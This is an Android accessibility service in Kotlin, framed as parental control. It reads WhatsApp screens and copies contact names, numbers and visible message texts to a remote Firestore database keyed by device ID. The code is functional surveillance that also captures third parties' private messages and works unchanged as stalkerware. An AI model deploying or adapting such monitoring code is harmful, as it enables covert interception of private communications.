package com.parentalcontrolandroid.accessibility

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.provider.Settings
import android.util.Log
import com.google.firebase.Timestamp
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.SetOptions

class ConversasAccessibilityService : AccessibilityService() {

    private val db by lazy { FirebaseFirestore.getInstance() }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event?.packageName != "com.whatsapp") return

        val root = rootInActiveWindow ?: return

        val contatoNome = extrairNomeDoContato(root)
        val contatoNumero = extrairNumeroDoContato(root) ?: contatoNome
        val mensagens = extrairMensagens(root)
        val ultimaMensagem = mensagens.lastOrNull() ?: ""
        val possuiMidia = mensagens.any { contemMidia(it) }

        val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        val dataHoje = java.time.LocalDate.now().toString() // YYYY-MM-DD

        val dados = mapOf(
            "contatoNome" to contatoNome,
            "contatoNumero" to contatoNumero,
            "mensagens" to mensagens,
            "ultimaMensagem" to ultimaMensagem,
            "possuiMidia" to possuiMidia,
            "timestamp" to Timestamp.now()
        )

        db.collection("dispositivos")
            .document(androidId)
            .collection("conversas")
            .document(dataHoje)
            .set(dados, SetOptions.merge())
    }

    private fun extrairNomeDoContato(node: AccessibilityNodeInfo?): String {
        node ?: return "Desconhecido"
        val possiveisNomes = mutableListOf<String>()
        percorrerNode(node) {
            if (it.className?.contains("TextView") == true && it.text?.isNotBlank() == true) {
                possiveisNomes.add(it.text.toString())
            }
        }
        return possiveisNomes.firstOrNull() ?: "Desconhecido"
    }

    private fun extrairNumeroDoContato(node: AccessibilityNodeInfo?): String? {
        node ?: return null
        val numeros = mutableListOf<String>()
        percorrerNode(node) {
            val texto = it.text?.toString() ?: return@percorrerNode
            if (texto.matches(Regex("\\+?\\d{8,}"))) {
                numeros.add(texto)
            }
        }
        return numeros.firstOrNull()
    }

    private fun extrairMensagens(node: AccessibilityNodeInfo?): List<String> {
        val lista = mutableListOf<String>()
        node ?: return lista
        percorrerNode(node) {
            val texto = it.text?.toString()?.trim()
            if (!texto.isNullOrBlank() && texto.length < 500) {
                lista.add(texto)
            }
        }
        return lista.distinct()
    }

    private fun contemMidia(texto: String): Boolean {
        val termos = listOf("áudio", "imagem", "foto", "vídeo", "documento", "figura")
        return termos.any { texto.lowercase().contains(it) }
    }

    private fun percorrerNode(node: AccessibilityNodeInfo?, acao: (AccessibilityNodeInfo) -> Unit) {
        node ?: return
        acao(node)
        for (i in 0 until node.childCount) {
            percorrerNode(node.getChild(i), acao)
        }
    }

    override fun onInterrupt() {
        Log.d("ConversasService", "Serviço de acessibilidade interrompido.")
    }
} 
